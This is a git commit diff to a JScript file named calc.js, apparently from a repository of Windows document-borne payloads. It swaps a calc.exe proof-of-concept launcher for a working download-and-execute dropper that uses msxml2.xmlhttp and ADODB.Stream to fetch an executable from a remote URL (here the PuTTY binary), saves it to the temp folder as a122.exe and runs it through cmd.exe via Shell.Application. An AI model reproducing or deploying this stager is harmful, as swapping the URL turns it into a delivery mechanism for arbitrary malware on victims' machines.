de07a6dfd7b13fc10f65f0895fa56ce258f0f37c
WordDocName1 <51110591+WordDocName1@users.noreply.github.com>
2019-06-01 16:07:06 +0800

    Update calc.js

--- calc.js
+++ calc.js
@@ -1,1 +1,55 @@
-var CMD = "/c calc.exe ";  var activeXObj = new ActiveXObject("Shell.Application");activeXObj.ShellExecute("cmd.exe", CMD, "", "open", "1");
+
+// +  ActiveXObject("Shell.Application")
+
+
+// + CreateObject("WScript.Shell")
+
+
+
+var url2down = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
+
+
+
+
+var FileName = "\\a122.exe"
+
+
+
+
+
+
+
+function downloadToFile(url, file) {
+	
+
+    var xhr = new ActiveXObject("msxml2.xmlhttp"), 
+        ado = new ActiveXObject("ADODB.Stream");
+
+    xhr.open("GET", url, false);
+    xhr.send();
+    if (xhr.status === 200) {
+        ado.type = 1;
+        ado.open();
+        ado.write(xhr.responseBody);
+        ado.saveToFile(file);
+        ado.close();
+    }
+}
+
+
+var FSO, list, i, Folder;
+var FullPath, TxtFile;  
+
+
+	FSO = WScript.CreateObject("Scripting.FileSystemObject");  
+	FullPath = FSO.GetSpecialFolder(2).Path
+	FullPath = FullPath + FileName
+	
+
+
+	downloadToFile(url2down ,FullPath )
+
+		var CMD = "/c "+FullPath
+
+  var activeXObj = new ActiveXObject("Shell.Application");
+	  activeXObj.ShellExecute("cmd.exe", CMD, "", "open", "1");
